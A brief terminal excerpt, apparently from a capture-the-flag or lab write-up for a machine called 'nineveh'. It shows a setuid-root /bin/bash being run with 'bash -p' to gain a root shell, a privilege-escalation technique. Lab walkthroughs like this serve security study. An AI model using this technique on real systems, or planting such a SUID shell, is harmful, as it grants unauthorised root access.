amrois@nineveh:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:/tmp$ bash -p
bash-4.3# whoami
root
bash-4.3#
```


